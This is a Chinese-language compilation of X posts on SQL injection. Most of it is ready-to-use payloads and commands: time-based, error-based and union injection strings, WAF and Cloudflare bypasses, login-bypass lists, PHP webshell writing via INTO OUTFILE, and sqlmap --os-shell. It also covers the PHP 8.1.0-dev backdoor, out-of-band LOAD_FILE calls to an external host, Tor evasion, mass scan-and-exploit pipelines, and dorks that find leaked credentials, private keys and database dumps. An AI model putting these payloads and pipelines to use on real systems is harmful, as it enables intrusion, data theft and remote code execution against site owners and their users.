# X 语料 · SQL 注入（1）

来源：X 公开贴子，经逐条人工阅读筛选后按技术主题归类。
仅收录纯文本正文，图片与外部媒体已被剥离。作者自述内容，未经复现验证。
原文件为逐条流水，同一载荷/同一条流水线被不同账号反复转贴（最多的重复 10 次），
此处合并为一份。纯战绩播报与"关注我频道"已剔除。

> 原贴时间跨度为 2019-2026，条目均为作者自述、未经复现验证；部分技巧可能已随产品版本失效。
> 判定协议：[SQL 注入](../by-type/sql-injection.md) · 索引与计数：[x-corpus.md](x-corpus.md) · 同类：x-exp-sqli（42 条）、x-residual-sqli（26 条） · 本文 357 行

## 判定：先确认再动手

- 确认注入最可靠的办法是让它执行一个逻辑运算，再看结果是否符合预期。
  例：`?username=Peter` 与 `?username=Peter' or '1'='1` 返回同样内容 → 有注入。
- 用不可信输入制造报错的四步：
  1. 提交 `'`，看有没有报错
  2. 提交 SQL 特有语法
  3. 提交布尔条件如 `'or 1=1'`，看响应差异
  4. 提交会引发时间延迟的载荷
- `?id=1` 和 `?id=2-1` 返回同一结果，就是注入的迹象。
- 另一种确认路径，能区分"真的注入了"和"只是回显变了"：
  1. 在一个正常参数值后面加 `'` 或 `"`
  2. 若响应变化，把 `'` 依次换成 `'`、`'||'`、`'+'`
  3. 如果又回到原始响应 → 基本可判定有注入
## 注入点在哪
- 别只测参数。以下都要试：
  - GET / POST 参数
  - 请求头（`X-Forwarded-For`、`User-Agent`、`Accept`、`Accept-Charset`、自定义头）
  - Cookie
  - URL 路径段
  - JSON body 的字段
  - 文件名 / 元数据
- 相对路径失败、绝对路径成功：
  `GET /portal/sqli-vulnerable.php?id=sqli` → 失败
  `GET http://domain/portal/sqli-vulnerable.php?id=sqli` → 成功
- 时间盲注打在了「忘记密码」接口上。
  载荷：`'%2b(select*from(select(sleep(20)))a)%2b'`
  端点：`/Forgot password`
  结论：逻辑上"不该查库"的端点照样会查库。
- `Target/?id=100` → 加 `-sleep(10)` 变成 `?id=100-sleep(10)`，页面卡 10 秒。
  直接在数字后面接，不需要引号闭合。
- 在 `sitemap.xml` 的 `offset` 参数上找到注入：
  `target[.]com/sitemap.xml?offset=1;SELECT IF((8303>8302),SLEEP(9),2356)#`
  `[1;SELECT IF((8303>8302),SLEEP(9),2356)#]` → 9 秒。（原作者 @GodfatherOrwa）
- fuzz 注入点时一定要试 `%22`（编码后的双引号）。
  MariaDB 分支对其他载荷都不报错，只有 `%22` 会吐出 SQL 错误：
  `/path1/path2/'` → 301
  `/path1/path2/"` → 301
  `/path1/path2/%22` → 301 且带 SQL 报错
- 应用是 PHP（见到 PHP 就先测注入）。
  login 参数里的盲注载荷没反应，撒到 User-Agent 里就中了：
  `User-Agent: "XOR(if(now()=sysdate(),sleep(5),0))XOR"` → 延迟 5 秒多。
- 请求头注入的批量探测：
  `Accept: "' or sleep(30)='"`
  `Accept-Charset: "' or sleep(30)='"`
  生效的话请求与响应之间会有 30 秒间隔。
- sqlmap 打请求头，用 `*` 标注入位置：
  `sqlmap -u "http://redacted.com" --header="X-Forwarded-For: 1*" --dbs --batch --random-agent --threads=10`
- 补充三点：
  * 换请求方法再注一遍
  * 直接把载荷放进 URL 路径：`target/admin/1SQLPayload/xxxx`
  * 把参数名本身改成载荷：`userSQLpayload=admin&password=admin`
- 路径注入实例：`/en/gallery/1` → `en/gallery/1'XOR(if(now()=sysdate(),sleep(3),0))OR'`
- admin 登录页限制了方法，但同一个功能在 API 上没限制：
  `POST /admin/login` → 405
  `POST /api/v01/admin/login` → 200 且存在盲注
- 一次投到处撒的探测串，一个参数能同时过一遍几类注入：
  `'"`>${{7*7}}`
  `'"` + 反引号 → 测 SQLi
  `'"` + 反引号 → 测 JS 注入
  `'"`> → 测 HTML 标签属性注入
  `${{7*7}}` → 测 CSTI
- 参数名里带结构也能测：
  `name[0+;select+sleep(8);;#++]=user&pass=pass`
- 见过直接把 SQL 语句塞进参数值的：`Url/?q=SELECT * FROM messages WHERE board.id = 'xxxxx'`
- QR 码内容也会进库。扫码功能可以试：
  `qr' OR 1=1 -- -`
  `qr' OR 1=1 -- #`
  `qr' OR '1'='1`
  `qr' OR '1'='1'--`
- PHP 应用里，登录参数、UA、Cookie 三个位置优先级最高。
## MySQL 时间盲注
- 高频时间盲注载荷：
  `0'XOR(if(now()=sysdate(),sleep(20),0))XOR'Z`
  变体（差别只在 sleep 秒数与引号配比）：
  `0'XOR(if(now()=sysdate(),sleep(5*5),0))OR'`
  `'XOR(if(now()=sysdate(),sleep(33),0))OR'`
  `'XOR(if(now()=sysdate(),sleep(3),0))XOR'`
  `1'XOR(94102*if(now()=sysdate()%2Csleep(6)%2C0))XOR'Z`（乘一个常数，某些 WAF 不认）
  原理：`now()=sysdate()` 为真时执行 sleep，配合 XOR 保持语法闭合。
- Akamai WAF 下能过的一条：`'XOR(if(now()=sysdate(),sleep(5*5),0))OR'`
- 同一个载荷放进 `X-Forwarded-For`：
  `0'XOR(if(now()=sysdate(),sleep(10),0))XOR'`
- sqlmap 打不动但 ghauri 能确认的盲注，载荷放在 JSON 里：
  `{"mobile_number":"8888888888'XOR(if(now()=sysdate(),SLEEP(5),0))XOR'Z"}`
- 一条载荷覆盖三种上下文（裸值 / 单引号 / 双引号）：
  `if(1=1,sleep(10),0)/*'XOR(if(1=1,sleep(10),0))OR'"XOR(if(1=1,sleep(10),0))OR"*/`
- 输入长度受限时用短的：`'XOR(sleep(5))OR'`
- `0'XOR(if(now()=sysdate(),sleep(6),0))XOR'Z` 在 POST 参数里同样有效。
  输入框只允许数字时，把载荷接在数字后面（`63770'XOR(...)XOR'Z`）即可。
- `(select*from(select(sleep(5)))a)` —— 另一条高频子查询型载荷。
  放进 JSON 参数：`(select*from(select(sleep(20)))a)`
  配 qsreplace 批量刷：见「自动化与工具」。
- POST 请求里的三重上下文一次覆盖：
  `(select(0)from(select(sleep(6)))v)/*'%2B(select(0)from(select(sleep(6)))v)%2B'"%2B(select(0)from(select(sleep(6)))v)%2B"*/`
- Cloudflare 403 绕过：
  `(select(0)from(select(sleep(10)))v)` → 403
  `(select(0)from(select(sleep(6)))v)/*'%2B(select(0)from(select(sleep(6)))v)%2B'%5C"%2B(select(0)from(select(sleep(6)))v)` → 时间盲注成功
  即：把同一子查询塞进三种引号上下文里，总有一种不被拦。
- 两种写法都执行成功：
  `param=blabla'+UNION+SELECT+sleep(5)+#`
  `param=blabla AND (SELECT 7987 FROM (SELECT(SLEEP(5)))CUcD)`
- 批量盲注验证（含 parallel 版）：
  `cat recon.txt | grep "=" | qsreplace "1 AND (SELECT 5230 FROM (SELECT(SLEEP(10)))SUmc)" > blindsqli.txt`
  `cat blindsqli.txt | parallel -j50 -q curl -o /dev/null -s -w %{time_total}\n`
- 自定义请求头命中：`' AND (SELECT 7658 FROM (SELECT(SLEEP(5)))WZHX)-- NxfC`
- `'+AND+(SELECT+2016+FROM+(SELECT(SLEEP(15)))SIfv)+AND+'vDZP'%3d'vDZP`
- `(select*from(select(sleep(15)))a)`
- `14)%20AND%20(SELECT%207415%20FROM%20(SELECT(SLEEP(10)))CwkU)%20AND%20(7515=7515)`
- 分号可以堆叠子查询，是最省事的确认方式：
  `; (SELECT(1)FROM(SELECT(SLEEP(5)))a)`
  响应延迟 5 秒（或 2 倍，取决于前面是否已有 sleep）→ 确认。
- 服务器实际 sleep 时间与请求值不成正比时，用比例校正：
  `test' OR SLEEP(5/7) --` → 实际睡 5 秒
  `test' OR SLEEP(10/7) --` → 实际睡 10 秒
- SSN 参数少于 10 位就可疑，补 4 位再加载荷：
  `'XOR(if(now()=sysdate(),sleep(3),0))XOR'`
  随着测试值增大响应时间递增 → 说明是在逐位比较。
- `%6c%75%33%6b%79%31%33' AND 1=CAST((SELECT version()) AS int) --`
  （原作者 @lu3ky13）
## 其他数据库
- ASP/MSSQL 盲注，载荷必须编码才能过：
  `';%20waitfor%20delay%20'0:0:6'%20--%20`
  MSSQL 侧的主力写法。
- PostgreSQL 盲注：
  `'; select pg_sleep(10)—`
- PG 上很难打的注入点，换成子查询拼接就通了：
  `''||(select 1 from (select pg_sleep(6))x)||'`
  建议直接进 wordlist。
- 需要按条件判断数据库类型时：
  `' AND CASE WHEN (SUBSTRING(version(),1,1)='P') THEN (SELECT 4564 FROM PG_SLEEP(5)) ELSE 4564 END=4564 OR '1'='1`
- JBOSS 老后台的 jsp 登录页，`waitfor delay '00:00:10'` 在 username 上直接命中。
- 同一场景下 MySQL 的对照载荷是 `'sleep(5)— -'`。
- Oracle：`1' AND 1=1 UNION SELECT null, user FROM DUAL --`
## 报错型、布尔型与联合查询
- 用 LIKE 做注入时加一个 `%`，能把整列数据带出来。
- 引号被过滤或转义时，`LIKE` 可以用十六进制值：
  `target.tld/some/8 and version() like 0x352e372e32342d6c6f6725%23`
  `0x352e372e32342d6c6f6725` = `5.7.24-log%`
- 报错型的经典触发集：
  `target.com?id="`
  `target.com?id='`
  `target.com?id=%60`（反引号）
  `target.com?id[]=)`
- WAF / fail2ban 场景下的报错型载荷：
  `(SELECT 6037 FROM(SELECT COUNT(*),CONCAT(0x7176706b71,(SELECT (ELT(6037=6037,1))),0x717a717671,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)`
- 另一种报错型，之后交给 ghauri 出库：
  `-11+PROCEDURE+ANALYSE(EXTRACTVALUE(9859,CONCAT(0x5c,(BENCHMARK(110000000,MD5(0x7562756f))))),1)--`
- union 出表名：
  `'+UNION+ALL+SELECT+1,2,(SELECT+GROUP_CONCAT(table_name+SEPARATOR+0x3c62723e)+FROM+INFORMATION_SCHEMA.TABLES+WHERE+TABLE_SCHEMA=0x636f70616c7075626c697368696e675f636f70616c),4,5,6,7,8,9,10,11,12,13,14,15 -- -`
- 注入点在 `.html` 后缀、反射在 title 里：
  `website/example'+union+select+CONCAT_WS(0x203a20,USER(),DATABASE(),VERSION())+--+.html`
- `1' AND 1=1 UNION SELECT null, user FROM DUAL --`
- Firebird 后端，默认 payload 出不了库名，改参数后才拿到表：
  `sqlmap -r req -p vuln --level 3 --risk 3 --thread 8 --dbms Firebird --tables`
## WAF 与过滤绕过
- MySQL 关键字打断（原作者 @brutelogic），`test` 是表名：
  ```
  SELECT-1e1FROM`test`
  SELECT~1.FROM`test`
  SELECT
  FROM`test`
  SELECT@^1.FROM`test`
  SELECT-id-1.FROM`test`
  ```
  第三条的思路是把 SELECT 与 FROM 之间换成真换行符（`0x0a`）。
  整体思路：用运算符/变量把 SELECT 与其它词隔开，绕过正则。
- union / select 的内联注释混淆：
  `+/*!u%6eion*/+/*!se%6cect*/+`
  `/**/uniUNIONon/**/aALLll/**/selSELECTect/**/`
  `1%')and(0)union(select(1),version(),3,4,5,6)%23%23%23`
  `/*!50000%55nIoN*/+/*!50000%53eLeCt*/`
  `union /*!50000%53elect*/`
- 同一组 union 检测绕过的另一版本：
  `/*!50000%55nIoN*/ /*!50000%53eLeCt*/`
  `%55nion(%53elect 1,2,3)– –`
  `/**//*!12345UNION SELECT*//**/`
  `/**//*!50000UNION SELECT*//**/`
  `/**/UNION/**//*!50000SELECT*//**/`
  `/*!50000UniON SeLeCt*/`
- PHP 里遇到 `addslashes()` 不必放弃。
  它的实现会把 `%bf%5c` 当成一个宽字符，吞掉转义用的反斜杠：
  `%bf%5c%27+and+30=30--`
- 数字型绕 WAF + sqlmap 配合：
  `8%20or%207250%3d0725`
  `sqlmap -u 'http://domain/anyfile.asp?id_test=8%20or%207250%3d07250' --dbs --random-agent --ignore-code=500 --code=200 -T tablename --columns --no-cast`
- 403 / WAF 拦了先换 tamper 并升级 sqlmap：
  `sqlmap -r req.txt --risk 3 --level 3 --dbs --tamper=space2comment,space2morehash`
- IP 被封时走 Tor：
  `sqlmap -r 1 --time-sec=10 --tor --tor-type=SOCKS5 --check-tor`
  不行就调 time-sec 或换代理池。
- 有些环境要改 `Content-Type` 才进得去注入逻辑，试非常规值。
- 带外（OOB）盲注，靠 `LOAD_FILE` 发起 UNC/SMB 请求：
  `'11111111111' AND (SELECT LOAD_FILE('\\<你的-oast-主机>\a'))`
  `'11111111111' AND (SELECT CONCAT('', (SELECT SLEEP(5)), (SELECT LOAD_FILE(CONCAT('\\', (SELECT '<你的-oast-主机>/a'))))))`
## 登录绕过
- 基础集：
  `admin'`
  `admin' #`
  `admin'/*`
  `' or 1=1--`
  `' or 1=1#`
  `' or 1=1/*`
  `') or '1'='1--`
  `') or C11=11--`
- `admin' --`、`admin' #`、`admin'/*` 三种截断注释都要试；
  `' OORR 1<2 #` 这类双写可过简单关键字过滤。
- 引号闭合的多种收尾：
  ```
  " or ""-"
  " or "" "
  " or ""&"
  " or ""^"
  " or ""*"
  ' or 'x'='x
  ) or ('x')=('x
  ')) or (('x'))=(('x
  " or "x"="x
  ") or ("x")=("x
  ```
- `admin" or 1=1--`、`admin') or '1'='1`、`" or ""&"`
- 一条载荷同时做列数探测与时间盲注：
  `ORDER BY 1--`
  `ORDER BY SLEEP(5)`
- 万能型：`" OR 1 = 1 -- -`
- Shodan 找登录框：`org:"TARGET" http.title:"login"`，然后老办法 `admin' or 1=1`。
- 带 LIKE 的绕过：`' or username like '%`
- ID 参数的系统性测法，六步走完基本能定性：
  ```
  ?id=1' order by 1 --+
  ?id=1' and "a"="a"--+
  ?id=1' and database()="securtiy"--+
  ?id=1' and substring(database(),1,1)="a"--+
  ?id=1' and sleep(2) and "a"="a"--+
  ?id=1' and sleep(2) and substring(database(),1,1)="a"--+
  ```
## 出数据、提权与 RCE
- 写 shell（MSSQL / MySQL 均是 OUTFILE 思路）：
  `union all select 1,2,3,4,"<?php echo shell_exec($_GET['cmd']);?>",6 into OUTFILE 'c:/inetpub/wwwroot/backdoor.php'`
- 两种写法，第二种不依赖列的个数：
  `id=ddos) union select 1,2,3,4,5,6,7,'<? phpinfo(); ?>' into outfile '/var/www/html/bWAPP/image/phpinfo.php'%23`
  `id=ddos) into outfile '/var/www/html/bWAPP/image/phpinfo' fields terminated by '<? phpinfo(); ?>'%23`
- `sqlmap --dbms=mysql -u "http://target.com/login.php" --os-shell`
  `sqlmap --dbms=mysql -u "http://target.com/login.php" --sql-shell`
- 一把梭的参数：
  `sqlmap --url="<url>" -p username --user-agent=SQLMAP --random-agent --threads=10 --risk=3 --level=5 --eta --dbms=MySQL --os=Linux --banner --is-dba --users --passwords --current-user --dbs`
- POST 请求：
  `sqlmap -u "https://sub.example.com/login.php" --data "username=admin&password=admin" -p "username,password" --method POST`
- 改 Host 指向源站 IP，再走本地代理：
  `sqlmap -r X.txt -p X --force-ssl --level 5 --risk 3 --dbs --random-agent --test-filter="MySQL >= 5.0.12 AND time-based blind (query SLEEP)" --proxy http://127.0.0.1:8080`
- JSON body：`sqlmap -r request.txt --level=5 --risk=3 --force-ssl --ignore-code=500 --dbs`
- MSSQL 上枚举不了库名，但能枚举表——别因为看不到 db 名就以为打错了：
  `sqlmap -u "https://example.com/endpoint?id=1" -p id --dbs --tables --level 3`
- PHP 8.1.0-dev 有个后门，`User-Agentt`（注意双 t）可换任意命令执行，
  也能当注入点验证：
  `User-Agentt: zerodiumsleep(5);`
  `User-Agentt: zerodiumsystem('id');`
  （原作者 @0x0SojalSec）
## 二次注入与特殊入口
- 二次注入的通用套路：
  1. 在写入端点存下载荷：`/?note=<payload>`
  2. 访问读取端点：`/?view`，载荷在此处才执行
- Oracle E-Business 的注册页可批量发现：
  `uncover -q '"X-ORACLE-DMS-ECID" http.title:"Login"' | httpx -silent | nuclei -t /root/nuclei-templates/misconfiguration/oracle-ebusiness-registration-enabled.yaml`
- Oracle E-Business 的几个注册端点：
  `/OA_HTML/ibeCAcpSSOReg.jsp`
  `/OA_HTML/ibeCRgpIndividualUser.jsp`
  `/OA_HTML/ibeCRgpPrimaryCreate.jsp`
  `/OA_HTML/ibeCRgpPartnerPriCreate.jsp`
- 先找到隐藏参数再测注入，比盲扫有效率：
  `gf sqli` 过滤出带 SQL 特征的 URL 后再进 sqlmap。
- 白盒/JS 审计思路：先确定 ORM（knex、sequelize 等），
  再只盯它的不安全方法：`query()`、`run()`、`execute()`、`raw()`。
- `https://example.com?teacherId=11 or 1=1;--`
  对应到后端就是 `SELECT * FROM teachers WHERE teacherId=11 or 1=1;`
## 敏感文件与情报收集
- 从目标及其子域里捞出库、备份、日志文件：
  `gau -subs http://target.com | deduplicate --hide-images --sort | httpx -silent | grep -iE '\.(sql|bak|log)' | tee -a sensitive_files`
- 已被删除的敏感文件仍可看：Google dork `site:*.target.com ext:sql` → 复制 URL → 到 `archive.org` 查，多数还能看到原内容。
- WordPress 下试 `/wp-content/` 和 `/wp-content/vagrant/` 里的 `.sql` 文件。
- 长期保存目录爆破结果——新 CVE 出来时能直接回查历史结果：
  `cat dirsearch/reports/* | grep INSTALL.mysql.txt | grep 200`
- `target[.]com/.travis.yml` 里泄露 MySQL 凭据。CI 配置文件都值得翻。
- 源码泄露的利用链：访问 `/index.php` 正常，访问 `/index.PHP` 直接拿到源码，
  从中读出数据库配置，再审出注入。
- 侦察流水线的起手式：Burp Param Miner → dirsearch → Burp Collaborator → sqlmap → amass → nmap/nikto。
- 高注入概率的参数名 dork：
  `inurl:id= | inurl:pid= | inurl:category= | inurl:cat= | inurl:action= | inurl:sid= | inurl:dir= inurl:& site:example[.]com`
- 用报错信息反向找索引页（比直接 fuzz 高效）：
  `site:target.com intext:"sql syntax near" | intext:"incorrect syntax near"`
  打开索引页后，用 `waitfor delay'0:0:15'--` 确认。
- `allintext:username filetype:log`
  `inurl:/proc/self/cwd`
  `intitle:"index of" inurl:ftp`
  `filetype:log username putty`
  `filetype:xls inurl:"email.xls"`
  `intitle:index.of id_rsa -id_rsa.pub`
  `"index of" "database.sql.zip"`
  `inurl:conf | inurl:env | inurl:cgi | inurl:bin | inurl:etc | inurl:root | inurl:sql | inurl:backup | inurl:admin | inurl:php site:example(.)com`
- GitHub 侧 dork：
  `PT_TOKEN language:bash`
  `extension:sql mysql dump password`
  `filename:wp-config.php`
  `rds.amazonaws.com password`
  `filename:.netrc password`
  `filename:WebServers.xml`
  `filename:config.php dbpasswd`
- `site:target.com ext:dbf |ext:mdb |ext:sql |ext:rdp |ext:ora |ext:env |ext:htaccess |ext:config`
- 从 Firefox 历史里造子域字典：
  `grep -Pao "https://[a-zA-Z0-9.-]+" ~/.mozilla/firefox/*/places.sqlite | sort -u | sed 's#.*://\([a-zA-Z0-9-]*\)\..*#\1#' | uniq -c | sort -rn`
- dirsearch 的扩展名列表（专盯库/备份/配置）：
  `dirsearch -b -u http://target.com -e conf,config,bak,backup,swp,old,db,sql,asp,aspx,py,rb,php,bkp,cache,cgi,csv,html,inc,jar,js,json,jsp,lock,log,rar,tar,txt,wadl -x 404,301,302 -r -R 3`
## 自动化与工具
- 最短闭环（15 分钟）：`echo http://test.com | gau | gf sqli > file.txt`，然后 `sqlmap -m file.txt --dbs --batch`。
- 标准流水线：
  ```
  sublist3r -d target | tee -a domains
  cat domains | httpx | tee -a alive
  cat alive | waybackurls | tee -a urls
  gf sqli urls >> sqli
  sqlmap -m sqli.txt --dbs --batch
  ```
  把 sublist3r 换成 subfinder、waybackurls 换成 gau / katana / hakrawler 都是等价变体。
- 单行版（KingOfBugbounty 原创）：
  `findomain -t http://testphp.vulnweb.com -q | httpx -silent | anew | waybackurls | gf sqli >> sqli ; sqlmap -m sqli -batch --random-agent --level 1`
- 带 dnsx 与 uro 去重的版本：
  `subfinder -dL domains.txt | dnsx | waybackurl | uro | grep "\?" | head -20 | httpx -silent > urls; sqlmap -m urls --batch --random-agent --level 1 | tee sqlmap.txt`
- `subfinder -d target -all -silent | gau | urldedupe | gf sqli > sql.txt; sqlmap -m sql.txt --batch --dbs --risk 2 --level 5 --random-agent | tee -a sqli.txt`
- 把 gau 换成 hakrawler 的变体同理。
- 快速筛"可能可注"的轻量判断，不跑 sqlmap：
  `grep "=" .txt | qsreplace "' OR '1" | httpx -silent -store-response-dir output -threads 100 | grep -q -rn "syntax\|mysql" output 2>/dev/null && printf "TARGET Could Be Exploitable\n" || printf "TARGET Not Vulnerable\n"`
- gau 出 URL 后按时间差筛：
  `gau DOMAIN.tld | sed 's/=[^=&]*/=YOUR_PAYLOAD/g' | grep ?*= | sort -u | while read host; do (time -p curl -Is $host) 2>&1 | awk '/real/ { r=$2; if (r >= TIME_OF_SLEEP) print host " => SQLi Time-Based" }'; done`
- Jeeves 的三个等价用法：
  `echo "http://testphp.vulnweb.com/artists.php?artist=1" | qsreplace "(select(0)from(select(sleep(5)))v)" | jeeves --payload-time 5`
  `echo "https://example.com" | gf sqli | qsreplace "(select(0)from(select(sleep(5)))v)" | jeeves --payload-time 10`
  `cat subs.txt | waybackurls | gf sqli | qsreplace "(select(0)from(select(sleep(10)))v)" | Jeeves --payload-time 10`
- 批量测请求头盲注：
  `cat domain.txt | httpx -silent -H "X-Forwarded-For: 'XOR(if(now()=sysdate(),sleep(13),0))OR" -rt -timeout 20 -mrt '>13'`
- 从 wayback 里挑带参数的 php/asp：
  `waybackurls http://testphp.vulnweb.com | grep -E '\bhttps?://\S+?=\S+' | grep -E '\.php|\.asp' | sort -u | sed 's/\(=[^&]*\)/=/g' | tee urls.txt | sort -u -o urls.txt`
- wayback 里捞敏感扩展：
  `waybackurls http://123.com | grep --color -E "\.xls|\.tar\.gz|\.bak|\.xml|\.xlsx|\.json|\.rar|\.pdf|\.sql|\.doc|\.docx|\.pptx|\.txt|\.zip|\.tgz|\.7z"`
- phpMyAdmin 的发现与利用顺序：
  `nuclei -l live-subs.txt -t nuclei-templates/http/exposed-panels/phpmyadmin-panel.yaml`
  → 默认口令 → fuzz → 测注入 → 响应篡改。
- GeoServer OGC Filter 注入（CVE-2023-25157）：
  `nuclei -uq 'title:"geoserver"' -t CVE-2023-25157.yaml`
